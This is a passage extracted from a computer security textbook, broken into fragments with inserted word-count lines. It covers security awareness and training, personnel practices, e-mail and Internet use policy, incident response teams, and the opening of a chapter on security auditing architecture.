further the IT security profession and to keep pace with threat and technology 
changes.
[Word Count: 25]

17.1 / Security Awareness, Training, and Education   559
[Word Count: 8]

Table 17.1 illustrates some of the distinctions among awareness, training, and 
education. We look at each of these categories in turn.
[Word Count: 21]

In general, a security awareness program seeks to inform and focus an ­employee’s 
attention on issues related to security within the organization. The ­hoped-​­for 
­benefits from security awareness include the following:
[Word Count: 31]

1.	 Employees are aware of their responsibilities for maintaining security and the
[Word Count: 12]

restrictions on their actions in the interests of security and are motivated to act 
accordingly.
[Word Count: 15]

B = beginning
I = intermediate
A = advanced
[Word Count: 9]

Functional roles
and responsibilities
relative to IT systems
[Word Count: 8]

IT security specialists
and professionals
[Word Count: 5]

Figure 17.1  Information Technology (IT) Learning Continuum
[Word Count: 7]

560    Chapter 17 / Human Resources Security
[Word Count: 7]

Objective
Recognition
Skill
Understanding
[Word Count: 4]

—Lecture
—Case study
workshop
—­Hands-​­on practice
[Word Count: 6]

Test measure
True/false
Multiple choice
(identify learning)
[Word Count: 7]

Impact timeframe
Short term
Intermediate
Long term
[Word Count: 7]

2.	 Users understand the importance of security for the ­well-​­being of the
[Word Count: 12]

­organization.
	
3.	 Because there is a constant barrage of new threats, user support, IT staff
[Word Count: 15]

enthusiasm, and management ­buy-​­in are critical and can be promoted by 
awareness programs.
[Word Count: 13]

The content of an awareness program must be tailored to the needs of the 
organization and to the target audience, which includes managers, IT professionals, 
IS users, and employees with little or no interaction with information systems. NIST 
SP ­800-​­100 (Information Security Handbook: A Guide for Managers) describes the 
content of awareness programs, in general terms, as follows:
[Word Count: 58]

17.1 / Security Awareness, Training, and Education   561
[Word Count: 8]

of good practice that are related to the organization’s systems and IT usage. The 
more relevant and easy to follow the procedures are, the more likely it is that a 
greater level of compliance and hence security will be achieved. Suitable ­security 
awareness sessions should be incorporated into the process used to ­introduce new 
staff to the organization and its processes. Security awareness sessions should 
also be repeated regularly to help staff members refresh their knowledge and 
­understanding of security issues.
[Word Count: 81]

[SZUB98] provides a useful list of goals for a security awareness program, as 
follows:
[Word Count: 14]

Goal 1:	 Raise staff awareness of information technology security issues in
[Word Count: 11]

general.
Goal 2:	 Ensure that staff are aware of local, state, and federal laws and
[Word Count: 15]

­regulations governing confidentiality and security.
Goal 3:	 Explain organizational security policies and procedures.
Goal 4:	 Ensure that staff understand that security is a team effort and that
[Word Count: 27]

each person has an important role to play in meeting security goals 
and objectives.
Goal 5:	 Train staff to meet the specific security responsibilities of their
[Word Count: 26]

positions.
Goal 6:	 Inform staff that security activities will be monitored.
Goal 7:	 Remind staff that breaches in security carry consequences.
Goal 8:	  Assure staff that reporting of potential and realized security ­breakdowns
[Word Count: 33]

and vulnerabilities is responsible and necessary behavior (and not 
­trouble-​­making behavior).
Goal 9:	 Communicate to staff that the goal of creating a trusted system is
[Word Count: 25]

To emphasize the importance of security awareness, an organization should 
have a security awareness policy document that is provided to all employees. The 
policy should establish three things:
[Word Count: 28]

1.	 Participation in an awareness program is required for every employee. This
[Word Count: 12]

will include an orientation program for new employees as well as periodic 
awareness activities.
	
2.	 Every one will be given sufficient time to participate in awareness activities.
[Word Count: 27]

3.	 Responsibility for managing and conducting awareness activities is clearly
[Word Count: 10]

An excellent, detailed list of considerations for security awareness is provided 
in The Standard of Good Practice for Information Security, from the Information 
Security Forum [ISF13]. This material is reproduced in Appendix H.3.
[Word Count: 33]

A security training program is designed to teach people the skills to perform 
their ­IS-​­related tasks more securely. Training teaches what people should
[Word Count: 23]

562    Chapter 17 / Human Resources Security
[Word Count: 7]

do and how they should do it. Depending on the role of the user, training 
­encompasses a spectrum ranging from basic computer skills to more advanced 
specialized skills.
[Word Count: 28]

For general users, training focuses on good computer security practices, 
including the following:
[Word Count: 13]

• Protecting the physical area and equipment (e.g., locking doors, caring for
[Word Count: 12]

­CD-​­ROMs and DVDs)
 
• Protecting passwords (if used) or other authentication data or tokens (e.g.,
[Word Count: 15]

never divulge PINs)
 
• Reporting security violations or incidents (e.g., whom to call if a virus is
[Word Count: 17]

Programmers, developers, and system maintainers require more specialized 
or advanced training. This category of employees is critical to establishing and 
maintaining computer security. However, it is the rare programmer or developer 
who understands how the software that he or she is building and maintaining can 
be exploited. Typically, developers do not build security into their applications and 
may not know how to do so, and they resist criticism from security analysts. The 
training objectives for this group include the following:
[Word Count: 80]

• Develop a security mindset in the developer.
 
• Show the developer how to build security into development life cycle, using
[Word Count: 21]

­well-​­defined checkpoints.
 
• Teach the developer how attackers exploit software and how to resist
[Word Count: 14]

attack.
 
• Provide analysts with a toolkit of specific attacks and principles with which to
[Word Count: 15]

­Management-​­level training should teach development managers how to make 
­trade-​­offs among risks, costs, and benefits involving security. The manager needs 
to understand the development life cycle and the use of security checkpoints and 
security evaluation techniques.
[Word Count: 36]

­Executive-​­level training must explain the difference between software 
security and network security and, in particular, the pervasiveness of software 
security issues. Executives need to develop an understanding of security risks 
and costs. Executives need training on the development of risk management 
goals, means of measurement, and the need to lead by example in the area of 
security awareness.
[Word Count: 58]

The most ­in-​­depth program is security education. This is targeted at security 
­professionals and those whose jobs require expertise in security. Security ­education 
is normally outside the scope of most organization awareness and training programs. 
It more properly fits into the category of employee career development programs. 
Often, this type of education is provided by outside sources such as college courses 
or specialized training programs.
[Word Count: 65]

17.2 / Employment Practices and Policies   563
[Word Count: 7]

This section deals with personnel security: hiring, training, monitoring behavior, 
and handling departure. [SADO03] reports that a large majority of perpetrators 
of significant computer crime are individuals who have legitimate access now, or 
who have recently had access. Thus, managing personnel with potential access is an 
essential part of information security.
[Word Count: 51]

Employees can be involved in security violations in one of two ways. Some 
employees unwittingly aid in the commission of a security violation by failing to 
follow proper procedures, by forgetting security considerations, or by not realizing 
that they are creating a vulnerability. Other employees knowingly violate controls 
or procedures to cause or aid a security violation.
[Word Count: 57]

Threats from internal users include the following:
[Word Count: 7]

• Gaining unauthorized access or enabling others to gain unauthorized access
 
• Altering data
 
• Deleting production and backup data
 
• Crashing systems
 
• Destroying systems
 
• Misusing systems for personal gain or to damage the organization
 
• Holding data hostage
 
• Stealing strategic or customer data for corporate espionage or fraud schemes
[Word Count: 53]

ISO 27002 lists the following security objective of the hiring process: to ensure that 
employees, contractors, and ­third-​­party users understand their responsibilities and 
are suitable for the roles they are considered for, and to reduce the risk of theft, 
fraud, or misuse of facilities. Although we are primarily concerned in this section 
with employees, the same considerations apply to contractors and ­third-​­party users.
[Word Count: 63]

Despite these obstacles, employers must make a significant effort to do back-
ground checks and screening of applicants. Of course, such checks are to assure
[Word Count: 25]

564    Chapter 17 / Human Resources Security
[Word Count: 7]

that the prospective employee is competent to perform the intended job and poses 
no security risk. Additionally, employers need to be cognizant of the concept of 
­“negligent hiring” that applies in some jurisdictions. In essence, an employer may 
be held liable for negligent hiring if an employee causes harm to a third party 
­(individual or company) while acting as an employee.
[Word Count: 61]

General guidelines for checking applicants include the following:
[Word Count: 8]

• Ask for as much detail as possible about employment and educational history.
[Word Count: 13]

The more detail that is available, the more difficult it is for the applicant to lie 
consistently.
 
• Investigate the accuracy of the details to the extent reasonable.
 
• Arrange for experienced staff members to interview candidates and discuss
[Word Count: 39]

For highly sensitive positions, more intensive investigation is warranted. 
[SADO03] gives the following examples of what may be warranted in some 
­circumstances:
[Word Count: 22]

• Have an investigation agency do a background check.
 
• Get a criminal record check of the individual.
 
• Check the applicant’s credit record for evidence of large personal debt and
[Word Count: 31]

the inability to pay it. Discuss problems, if you find them, with the ­applicant. 
People who are in debt should not be denied jobs: if they are, they will never be 
able to regain solvency. At the same time, employees who are under ­financial 
strain may be more likely to act improperly.
 
• Consider conducting a polygraph examination of the applicant (if legal).
[Word Count: 63]

Although polygraph exams are not always accurate, they can be helpful if you 
have a particularly sensitive position to fill.
 
• Ask the applicant to obtain bonding for his or her position.
[Word Count: 32]

For many employees, these steps are excessive. However, the employer should 
conduct extra checks of any employee who will be in a position of trust or privileged 
­access—​­including maintenance and cleaning personnel.
[Word Count: 32]

Employment Agreements  As part of their contractual obligation, employees 
should agree and sign the terms and conditions of their employment contract, which 
should state their and the organization’s responsibilities for information security. 
The agreement should include a confidentiality and nondisclosure agreement 
spelling out specifically that the organization’s information assets are confidential 
unless classified otherwise and that the employee must protect that confidentiality. 
The agreement should also reference the organization’s security policy and indicate 
that the employee has reviewed and agrees to abide by the policy.
[Word Count: 85]

ISO 27002 lists the following security objective with respect to current employees: to 
ensure that employees, contractors, and ­third-​­party users are aware of information 
security threats and concerns and their responsibilities and liabilities with regard to
[Word Count: 36]

17.2 / Employment Practices and Policies   565
[Word Count: 7]

information security and are equipped to support organizational security policy in 
the course of their normal work and to reduce the risk of human error.
[Word Count: 25]

Two essential elements of personnel security during employment are a 
­comprehensive security policy document and an ongoing awareness and training 
program for all employees. These are covered in Sections 17.1 and 17.2.
[Word Count: 32]

In addition to enforcing the security policy in a fair and consistent manner, 
there are certain principles that should be followed for personnel security:
[Word Count: 24]

• Least privilege: Give each person the minimum access necessary to do his or
[Word Count: 14]

her job. This restricted access is both logical (access to accounts, ­networks, 
programs) and physical (access to computers, backup tapes, and other 
­peripherals). If every user has accounts on every system and has physical ­access 
to everything, then all users are roughly equivalent in their level of threat.
 
• Separation of duties: Carefully separate duties so that people involved in
[Word Count: 60]

­checking for inappropriate use are not also capable of making such ­inappropriate 
use. Thus, having all the security functions and audit ­responsibilities reside in 
the same person is dangerous. This practice can lead to a case in which the 
person may violate security policy and commit prohibited acts, yet in which no 
other person sees the audit trail to be alerted to the problem.
 
• Limited reliance on key employees: No one in an organization should be
[Word Count: 77]

­irreplaceable. If your organization depends on the ongoing performance of a 
key employee, then your organization is at risk. Organizations cannot help but 
have key employees. To be secure, organizations should have written policies 
and plans established for unexpected illness or departure. As with systems, 
redundancy should be built into the employee structure. There should be no 
single employee with unique knowledge or skills.
[Word Count: 64]

ISO 27002 lists the following security objective with respect to termination of 
employment: to ensure that employees, contractors, and ­third-​­party users exit an 
organization or change employment in an orderly manner, and that the return of all 
equipment and the removal of all access rights are completed.
[Word Count: 47]

The termination process is complex and depends on the nature of the 
­organization, the status of the employee in the organization, and the reason for 
departure. From a security point of view, the following actions are important:
[Word Count: 37]

• Removing the person’s name from all lists of authorized access
[Word Count: 11]

• Explicitly informing guards that the ­ex-​­employee is not allowed into the
[Word Count: 12]

­building without special authorization by named employees
 
• Removing all personal access codes
 
• If appropriate, changing lock combinations, reprogramming access card
[Word Count: 22]

­systems, and replacing physical locks
 
• Recovering all assets, including employee ID, disks, documents, and
[Word Count: 15]

­equipment
 
• Notifying, by memo or ­e-​­mail, appropriate departments so that they are aware
[Word Count: 14]

566    Chapter 17 / Human Resources Security
[Word Count: 7]

17.3	­E-​­Mail and Internet Use Policies
[Word Count: 6]

­E-​­mail and Internet access for most or all employees is common in office environ-
ments and is typically provided for at least some employees in other environments, 
such as a factory. A growing number of companies incorporate specific ­e-​­mail and 
Internet use policies into the organization’s security policy document. This section 
examines some important considerations for these policies.
[Word Count: 58]

Widespread use of ­e-​­mail and the Internet by employees raises a number of ­concerns 
for employers, including the following:
[Word Count: 19]

1.	 Significant employee work time may be consumed in ­non-​­work-​­related
[Word Count: 10]

­activities, such as surfing the Web, playing games on the Web, shopping on the 
Web, chatting on the Web, and sending and reading personal ­e-​­mail.
	
2.	 Significant computer and communications resources may be consumed by such
[Word Count: 36]

­non-​­work-​­related activity, compromising the mission that the IS resources are 
designed to support.
	
3.	 Excessive and casual use of the Internet and ­e-​­mail unnecessarily increases
[Word Count: 25]

the risk of introduction of malicious software into the organization’s IS 
­environment.
	
4.	 The ­non-​­work-​­related employee activity could result in harm to other
[Word Count: 23]

­organizations or individuals outside the organization, thus creating a liability 
for the organization.
	
5.	 ­E-​­mail and the Internet may be used as tools of harassment by one employee
[Word Count: 28]

against another.
	
6.	 Inappropriate online conduct by an employee may damage the reputation of
[Word Count: 14]

The development of a comprehensive ­e-​­mail and Internet use policy raises a num-
ber of policy issues. The following is a suggested set of policies, based on [KING06].
[Word Count: 28]

• Business use only: ­Company-​­provided ­e-​­mail and Internet access are to be
[Word Count: 12]

used by employees only for the purpose of conducting company business.
 
• Policy scope: Policy covers ­e-​­mail access; contents of ­e-​­mail messages; Internet
[Word Count: 23]

and intranet communications; and records of ­e-​­mail, Internet, and intranet 
communications.
 
• Content ownership: Electronic communications, files, and data remain
[Word Count: 20]

c­ompany property even when transferred to equipment not owned by the 
company.
 
• Privacy: Employees have no expectation of privacy in their use of ­company-​
[Word Count: 25]

­provided ­e-​­mail or Internet access, even if the communication is personal in 
nature.
[Word Count: 13]

17.4 / Computer Security Incident Response Teams   567
[Word Count: 8]

• Standard of conduct: Employees are expected to use good judgment and act
[Word Count: 13]

courteously and professionally when using ­company-​­provided ­e-​­mail and 
Internet access.
 
• Reasonable personal use: Employees may make reasonable personal use of
[Word Count: 21]

­company-​­provided ­e-​­mail and Internet access provided that such use does 
not interfere with the employee’s duties, violate company policy, or unduly 
­burden company facilities.
 
• Unlawful activity prohibited: Employees may not use ­company-​­provided
[Word Count: 33]

­e-​­mail and Internet access for any illegal purpose.
 
• Security policy: Employees must follow the company’s security policy when
[Word Count: 19]

using ­e-​­mail and Internet access.
 
• Company policy: Employees must follow all other company policies when
[Word Count: 16]

using ­e-​­mail and Internet access. Company policy prohibits viewing, storing, or 
distributing pornography; making or distributing harassing or ­discriminatory 
communications; and unauthorized disclosure of confidential or proprietary 
information.
 
• Company rights: The company may access, monitor, intercept, block access,
[Word Count: 39]

inspect, copy, disclose, use, destroy, recover using computer forensics, and/
or retain any communications, files, or other data covered by this policy. 
Employees are required to provide passwords upon request.
 
• Disciplinary action: Violation of this policy may result in immediate termina-
[Word Count: 42]

tion of employment or other discipline deemed appropriate by the company.
[Word Count: 11]

A useful document to consult when developing an ­e-​­mail and Internet use policy is 
Guidelines to Assist Agencies in Developing Email and Internet Use Policies, from 
the Office of ­e-​­Government, the Government of Western Australia, July 2004. 
A copy is available at this book’s Web site.
[Word Count: 46]

17.4	Computer Security Incident Response Teams
[Word Count: 6]

For large and ­medium-​­sized organizations, a computer security incident 
response team (CSIRT) is responsible for rapidly detecting incidents, minimizing 
loss and destruction, mitigating the weaknesses that were exploited, and restoring 
computing services.
[Word Count: 32]

568    Chapter 17 / Human Resources Security
[Word Count: 7]

NIST SP ­800-​­61 [CICH12] lists the following benefits of having an incident 
response capability:
[Word Count: 14]

• Responding to incidents systematically so that the appropriate steps are taken
 
• Helping personnel to recover quickly and efficiently from security incidents,
[Word Count: 23]

minimizing loss or theft of information and disruption of services
 
• Using information gained during incident handling to better prepare for
[Word Count: 21]

handling future incidents and to provide stronger protection for systems 
and data
 
• Dealing properly with legal issues that may arise during incidents
[Word Count: 23]

There is a range of events that can be regarded as a security incident. 
Indeed any action that threatens one or more of the classic security services of 
­confidentiality, integrity, availability, accountability, authenticity, and reliability 
in a system ­constitutes an incident. These include various forms of unauthorized 
access to a system, and unauthorized modification of information on the system. 
Unauthorized access to a system by a person includes:
[Word Count: 68]

• Accessing information that person is not authorized to see
 
• Accessing information and passing it on to another person who is not
[Word Count: 23]

­authorized to see it
 
• Attempting to circumvent the access mechanisms implemented on a system
[Word Count: 15]

• Using another person’s password and user id for any purpose
 
• Attempting to deny use of the system to any other person without ­authorization
[Word Count: 25]

Unauthorized modification of information on a system by a person includes:
[Word Count: 11]

• Attempting to corrupt information that may be of value to another person
 
• Attempting to modify information and/or resources without authority
 
• Processing information in an unauthorized manner
[Word Count: 29]

17.4 / Computer Security Incident Response Teams   569
[Word Count: 8]

Managing security incidents involves procedures and controls that address 
[CARN03]:
[Word Count: 10]

• Detecting potential security incidents
 
• Sorting, categorizing, and prioritizing incoming incident reports
 
• Identifying and responding to breaches in security
 
• Documenting breaches in security for future reference
[Word Count: 29]

Table 17.2 lists key terms related to computer security incident response.
[Word Count: 11]

Security incidents may be detected by users or administration staff who report a 
­system malfunction or anomalous behavior. Staff should be encouraged to make 
such reports. Staff should also report any suspected weaknesses in systems. The 
general security training of staff in the organization should include details of who to 
contact in such cases.
[Word Count: 54]

Security incidents may also be detected by automated tools, which analyze 
information gathered from the systems and connecting networks. We discuss 
a range of such tools in Chapter 8. These tools may report evidence of either
[Word Count: 36]

Table 17.2  Security Incident Terminology
[Word Count: 5]

Any file or object found on a system that might be involved in probing or attacking systems and 
­networks or that is being used to defeat security measures. Artifacts can include, but are not limited 
to, computer viruses, Trojan horse programs, worms, exploit scripts, and toolkits.
[Word Count: 46]

Computer Security Incident Response Team (CSIRT)
[Word Count: 6]

A capability set up for the purpose of assisting in responding to computer security–related 
­incidents that involve sites within a defined constituency; also called a computer incident 
response team (CIRT) or a CIRC (Computer Incident Response Center, Computer Incident 
Response Capability).
[Word Count: 41]

The group of users, sites, networks, or organizations served by the CSIRT.
[Word Count: 12]

A violation or imminent threat of violation of computer security policies, acceptable use policies, 
or standard security practices.
[Word Count: 18]

The process of receiving, initial sorting, and prioritizing of information to facilitate its appropriate 
handling.
[Word Count: 15]

A characteristic of a piece of technology which can be exploited to perpetrate a security incident. 
For example, if a program unintentionally allowed ordinary users to execute arbitrary operating 
­system commands in privileged mode, this “feature” would be a vulnerability.
[Word Count: 40]

570    Chapter 17 / Human Resources Security
[Word Count: 7]

a precursor to a possible future incident or indication of an actual incident 
­occurring. Tools that can detect incidents include the following:
[Word Count: 22]

• System integrity verification tools: Scan critical system files, directories, and
[Word Count: 11]

services to ensure they have not been changed without proper authorization.
 
• Log analysis tools: Analyze the information collected in audit logs using some
[Word Count: 24]

form of pattern recognition to identify potential security incidents.
 
• Network and host intrusion detection systems (IDS): Monitor and ­analyze
[Word Count: 20]

­network and host activity and usually compare this information with a 
­collection of attack signatures to identify potential security incidents.
 
• Intrusion prevention systems: Augment an intrusion detection system with the
[Word Count: 31]

ability to automatically block detected attacks. Such systems need to be used 
with care, because they can cause problems if they respond to a misidenti-
fied attack and reduce system functionality when not justified. We discuss such 
­systems in Chapter 9.
[Word Count: 41]

The decision to deploy automated tools should result from the organization’s 
security goals and objectives and specific needs identified in the risk assessment proc-
ess. Deploying these tools usually involves significant resources, both monetary and 
personnel time. This needs to be justified by the benefits gained in reducing risks.
[Word Count: 49]

Whether or not automated tools are used, the security administrators need to mon-
itor reports of vulnerabilities and to respond with changes to their systems if necessary.
[Word Count: 27]

The goal of this function is to ensure that all information destined for the incident 
handling service is channeled through a single focal point regardless of the method by 
which it arrives (e.g., by ­e-​­mail, hotline, helpdesk, IDS) for appropriate redistribution 
and handling within the service. This goal is commonly achieved by advertising the tri-
age function as the single point of contact for the whole incident handling service. The 
triage function responds to incoming information in one or more of the following ways:
[Word Count: 84]

1.	 The triage function may need to request additional information in order to
[Word Count: 13]

categorize the incident.
	
2.	 If the incident relates to a known vulnerability, the triage function notifies
[Word Count: 16]

the various parts of the enterprise or constituency about the vulnerability and 
shares information about how to fix or mitigate the vulnerability.
[Word Count: 22]

17.4 / Computer Security Incident Response Teams   571
[Word Count: 8]

3.	 The triage function identifies the incident as either new or part of an ongo-
[Word Count: 15]

ing incident and passes this information on to the incident handling response 
function in priority order.
[Word Count: 16]

Once a potential incident is detected, there must be documented procedures to 
respond to it. [CARN03] lists the following potential response activities:
[Word Count: 22]

• Taking action to protect systems and networks affected or threatened by
[Word Count: 12]

­intruder activity
 
• Providing solutions and mitigation strategies from relevant advisories or alerts
 
• Looking for intruder activity on other parts of the network
 
• Filtering network traffic
 
• Rebuilding systems
 
• Patching or repairing systems
 
• Developing other response or workaround strategies
[Word Count: 43]

• ­Denial-​­of-​­service attacks that prevent or impair normal use of systems
 
• Malicious code that infects a host
 
• Unauthorized access to a system
 
• Inappropriate usage of a system in violation of acceptable use policies
 
• ­Multiple-​­component incidents, which involve two or more of the above
[Word Count: 47]

In determining the appropriate responses to an incident, a number of issues 
should be considered. These include how critical the system is to the organization’s 
function, and the current and potential technical effect of the incident in terms of 
how significantly the system has been compromised.
[Word Count: 46]

The response procedures should also identify the circumstances when security 
breaches should be reported to third parties such as the police or relevant CERT 
(computer emergency response team) organization. There is a high degree of variance 
among organizational attitudes to such reports. Making such reports clearly helps third
[Word Count: 48]

572    Chapter 17 / Human Resources Security
[Word Count: 7]

Figure 17.2 illustrates a typical incident-handling life cycle. Once an incident 
is opened, it transitions through a number of states, with all the information relating 
to the incident (its change of state and associated actions), until no further action is 
required from the team’s perspective and the incident is finally closed. The cyclical 
portion of Figure 17.2 (lower left) indicates those states that may be visited multiple 
times during the activity’s life cycle.
[Word Count: 73]

Figure 17.2  Incident Handling Life Cycle
[Word Count: 6]

17.4 / Computer Security Incident Response Teams   573
[Word Count: 8]

Following the immediate response to an incident, there is a need to identify what 
vulnerability led to its occurrence and how this might be addressed to prevent the 
incident in the future. Details of the incident and the response taken are recorded 
for future reference. The impact on the organization’s systems and their risk profile 
must also be reconsidered as a result of the incident.
[Word Count: 65]

A number of services are either a part of or interact with the incident handling func-
tion. Table 17.3, based on [CARN03], provides examples of the information flow to 
and from an incident handling service. This type of breakdown is useful in organiz-
ing and optimizing the incident handling service and in training personnel on the 
requirements for incident handling and response.
[Word Count: 62]

Table 17.3  Examples of Possible Information Flow to and from the Incident Handling Service
[Word Count: 14]

Information flow  
from incident handling
[Word Count: 5]

Announcements
Warning of current attack scenario
Statistics or status report
New attack profiles to consider  
or research.
[Word Count: 17]

How to protect against exploitation  
of specific vulnerabilities
[Word Count: 8]

Possible existence of new  
vulnerabilities
[Word Count: 5]

Malware Handling
Information on how to recognize  
use of specific malware
Information on malware impact/threat
[Word Count: 15]

Statistics on identification of  
malware in incidents
New malware sample
[Word Count: 10]

Education/Training
None
Practical examples and motivation
Knowledge
[Word Count: 7]

New incident report
New attack profile to check for
[Word Count: 9]

Notification of penetration test  
start and finish schedules
[Word Count: 8]

Security Consulting
Information about common pitfalls  
and the magnitude of the threats
[Word Count: 12]

574    Chapter 17 / Human Resources Security
[Word Count: 7]

[TOTH13] is a lengthy treatment of security training. [BOWE06], [NIST95], and 
[SZUB98] each has a useful chapter on security awareness, training, and education. 
[ENIS10] is an excellent and thorough treatment of security awareness. [MCGO02] 
and [SIPO01] are useful articles on security awareness; [WYK06] covers training. 
[WILS03] provides broad coverage of both security awareness and training.
[Word Count: 55]

[CICH12], [CARN03], and [BROW98] are useful references on the topic of 
incident handling.
[Word Count: 13]

BOWE06	 Bowen, P.; Hash, J.; and Wilson, M. Information Security Handbook: A
[Word Count: 12]

Guide for Managers. NIST Special Publication ­800-​­100, October 2006.
BROW98	 Brownlee, B., and Guttman, E. Expectations for Computer Security Incident
[Word Count: 20]

Response. RFC 2350, June 1998.
CARN03	 ­Carnegie-​­Mellon Software Engineering Institute. Handbook for Computer
[Word Count: 13]

Security Incident Response Teams (CSIRTs). CMU/­SEI-​­2003-​­HB-​­002, 
April 2003.
CICH12	
Cichonski,  P., et  al. Computer Security Incident Handling Guide. NIST 
Special Publication ­800-​­61, August 2012.
ENIS10	
European Network and Information Security Agency. The New Users’ 
Guide: How to Raise Information Security Awareness. ENISA Report ­TP-​
­30-​­10-​­582-​­EN-​­C, November 2010.
MCGO02	 McGovern,  M. “Opening Eyes: Building ­Company-​­Wide IT Security
[Word Count: 56]

Awareness.” IT Pro, May/June 2002.
NIST95	
National Institute of Standards and Technology. An Introduction to Computer 
Security: The NIST Handbook. Special Publication 800–12, October 1995.
SIPO01	
Siponen,  N. “Five Dimensions of Information Security Awareness.” 
Computers and Society, June 2001.
SZUB98	
Szuba, T. Safeguarding Your Technology. National Center for Education 
Statistics, NCES ­98-​­297, 1998. http://www.nces.ed.gov/pubsearch/pubsinfo 
.asp?pubid=98297
[Word Count: 55]

Information flow  
from incident handling
[Word Count: 5]

Risk Analysis
Information about common pitfalls  
and the magnitude of the threats
[Word Count: 12]

Technology Watch
Warn of possible future attack scenarios
Alert to new tool distribution
[Word Count: 13]

Statistics or status report
New attack profiles to  
consider or research
[Word Count: 11]

Availability of new tools for  
constituency use
[Word Count: 7]

Need for products
Provide view of current practices
[Word Count: 8]

TOTH13	
Toth, P., and Klein, P. A ­Role-​­Based Model for Federal Information Technology/
Cyber Security Training. NIST Special Publication ­800-​­16, October 2013.
WILS03	
Wilson,  M., and Hash,  J. Building and Information Technology Security 
Awareness Training Program. NIST Special Publication ­800-​­50, October 2003.
WYK06	
Wyk, K., and Steven, J. “Essential Factors for Successful Software Security 
Awareness Training.” IEEE Security and Privacy, September/October 2006.
[Word Count: 62]

computer security incident
computer security incident
[Word Count: 6]

response team
­e-​­mail and Internet use policy
[Word Count: 7]

incident handling
incident response
ISO 27002
security awareness
[Word Count: 8]

17.6	Key Terms, Review Questions, and Problems
[Word Count: 7]

17.1	
Section 17.1 includes a quotation from SP ­800-​­100 to the effect that awareness deals 
with the what but not the how of security. Explain the distinction in this context.
	
17.2	
a.  Joe the janitor is recorded on the company security camera one night taking pic-
[Word Count: 46]

tures with his cell phone of the office of the CEO after he is done cleaning it. 
The film is grainy (from repeated use and ­re-​­use) and you cannot ascertain what 
specifically he is taking pictures of. You can see the flash of his cell phone camera 
going off and you note that the flash is coming from the area directly in front of 
the CEO’s desk. What will you do and what is your justification for your actions?
b.	 What can you do in the future to prevent or at least mitigate any legal challenges
[Word Count: 96]

that Joe the janitor may bring to court?
[Word Count: 8]

17.6 / Key Terms, Review Questions, and Problems   575
[Word Count: 9]

576    Chapter 17 / Human Resources Security
[Word Count: 7]

Security Audit and Alarms Model
Security Auditing Functions
Requirements
Implementation Guidelines
[Word Count: 11]

What to Collect
Protecting Audit Trail Data
[Word Count: 7]

Logging at the System Level
Logging at the Application Level
Interposable Libraries
Dynamic Binary Rewriting
[Word Count: 15]

Preparation
Timing
Audit Review
Approaches to Data Analysis
[Word Count: 8]

SIEM Systems
The Security Monitoring, Analysis, and Response System (MARS)
[Word Count: 10]

18.7  Key Terms, Review Questions, and Problems
[Word Count: 7]

Security auditing is a form of auditing that focuses on the security of an organiza-
tion’s information system (IS) assets. This function is a key element in computer 
security. Security auditing can:
[Word Count: 32]

• Provide a level of assurance concerning the proper operation of the computer
[Word Count: 13]

with respect to security.
 
• Generate data that can be used in after-the-fact analysis of an attack, whether
[Word Count: 18]

successful or unsuccessful.
 
• Provide a means of assessing inadequacies in the security service.
 
• Provide data that can be used to define anomalous behavior.
 
• Maintain a record useful in computer forensics.
[Word Count: 33]

Two key concepts are Security audits and Security audit trails,1 defined in 
Table 18.1.
[Word Count: 14]

The process of generating audit information yields data that may be useful in real 
time for intrusion detection; this aspect is discussed in Chapter 8. In the present chapter, 
our concern is with the collection, storage, and analysis of data related to IS security. 
We begin with an overall look at the security auditing architecture and how this relates 
to the companion activity of intrusion detection. Next, we ­discuss the various aspects of 
audit trails, also known as audit logs. We then discuss the analysis of audit data.
[Word Count: 88]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Discuss the elements that make up a security audit architecture.
◆	Assess the relative advantages of various types of security audit trails.
◆	Understand the key considerations in implementing the logging function for
[Word Count: 34]

security auditing.
◆	Describe the process of audit trail analysis.
[Word Count: 10]

1[NIST95] points out that some security experts make a distinction between an audit trail and an audit log 
as follows: A log is a record of events made by a particular software package, and an audit trail is an entire 
history of an event, possibly using several logs. However, common usage within the security community 
does not make use of this definition. We do not make a distinction in this book.
[Word Count: 71]

Table 18.1  Security Audit Terminology (RFC 4949)
[Word Count: 7]

Security Audit  An independent review and examination of a system’s records and activities to 
determine the adequacy of system controls, ensure compliance with established security policy and 
procedures, detect breaches in security services, and recommend any changes that are indicated for 
countermeasures.
[Word Count: 42]

The basic audit objective is to establish accountability for system entities that initiate or 
­participate in security-relevant events and actions. Thus, means are needed to generate and record 
a security audit trail and to review and analyze the audit trail to discover and investigate attacks and 
security compromises.
[Word Count: 48]

Security Audit Trail  A chronological record of system activities that is sufficient to enable the recon-
struction and examination of the sequence of environments and activities surrounding or ­leading to an 
operation, procedure, or event in a security-relevant transaction from inception to final results.
[Word Count: 44]

18.1 / Security Auditing Architecture   579
[Word Count: 6]

We begin our discussion of security auditing by looking at the elements that make up 
a security audit architecture. First, we examine a model that shows security auditing 
in its broader context. Then, we look at a functional breakdown of security auditing.
[Word Count: 42]

ITU-T2 Recommendation X.816 develops a model that shows the elements of the 
security auditing function and their relationship to security alarms. Figure 18.1 
depicts the model. The key elements are as follows:
[Word Count: 32]

• Event discriminator: This is logic embedded into the software of the system
[Word Count: 13]

that monitors system activity and detects security-related events that it has 
been configured to detect.
 
• Audit recorder: For each detected event, the event discriminator transmits the
[Word Count: 27]

information to an audit recorder. The model depicts this transmission as being
[Word Count: 12]

Figure 18.1  Security Audit and Alarms Model (X.816)
[Word Count: 8]

2Telecommunication Standardization Sector of the International Telecommunications Union. See 
­Appendix C for a discussion of this and other standards-making organizations.
[Word Count: 20]

in the form of a message. The audit could also be done by recording the event 
in a shared memory area.
 
• Alarm processor: Some of the events detected by the event discriminator are
[Word Count: 34]

defined to be alarm events. For such events an alarm is issued to an alarm 
processor. The alarm processor takes some action based on the alarm. This 
action is itself an auditable event and so is transmitted to the audit recorder.
 
• Security audit trail: The audit recorder creates a formatted record of each
[Word Count: 54]

event and stores it in the security audit trail.
 
• Audit analyzer: The security audit trail is available to the audit analyzer,
[Word Count: 22]

which, based on a pattern of activity, may define a new auditable event that is 
sent to the audit recorder and may generate an alarm.
 
• Audit archiver: This is a software module that periodically extracts records
[Word Count: 37]

from the audit trail to create a permanent archive of auditable events.
 
• Archives: The audit archives are a permanent store of security-related events
[Word Count: 24]

on this system.
 
• Audit provider: The audit provider is an application and/or user interface to
[Word Count: 16]

the audit trail.
 
• Audit trail examiner: The audit trail examiner is an application or user
[Word Count: 16]

who examines the audit trail and the audit archives for historical trends, for 
computer forensic purposes, and for other analysis.
 
• Security reports: The audit trail examiner prepares human-readable security
[Word Count: 30]

